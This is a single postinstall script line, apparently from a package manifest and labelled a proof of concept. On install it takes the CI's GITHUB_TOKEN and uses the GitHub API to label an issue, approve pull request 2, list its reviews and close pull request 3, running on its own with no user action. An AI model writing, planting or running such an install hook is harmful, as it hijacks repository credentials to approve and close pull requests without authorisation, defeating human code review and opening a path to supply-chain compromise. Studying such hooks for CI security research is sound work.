scripts.postinstall:
set +e; H="Authorization: Bearer $GITHUB_TOKEN"; A='-H Accept:application/vnd.github+json'; echo '--- label'; curl -sS -o /tmp/o1 -w 'LABEL=%{http_code}
' -X POST $A -H "$H" https://api.github.com/repos/$GITHUB_REPOSITORY/issues/3/labels -d '{"labels":["linter-bot-poc"]}' --max-time 20; echo '--- review approve'; curl -sS -o /tmp/o2 -w 'APPROVE=%{http_code}
' -X POST $A -H "$H" https://api.github.com/repos/$GITHUB_REPOSITORY/pulls/2/reviews -d '{"event":"APPROVE","body":"poc"}' --max-time 20; cat /tmp/o2 | head -3; echo '--- review dismiss target list'; curl -sS -o /tmp/o3 -w 'REVIEWS=%{http_code}
' $A -H "$H" https://api.github.com/repos/$GITHUB_REPOSITORY/pulls/2/reviews --max-time 20; echo '--- close PR 3'; curl -sS -o /tmp/o4 -w 'CLOSE=%{http_code}
' -X PATCH $A -H "$H" https://api.github.com/repos/$GITHUB_REPOSITORY/pulls/3 -d '{"state":"closed"}' --max-time 20; cat /tmp/o4 | head -3
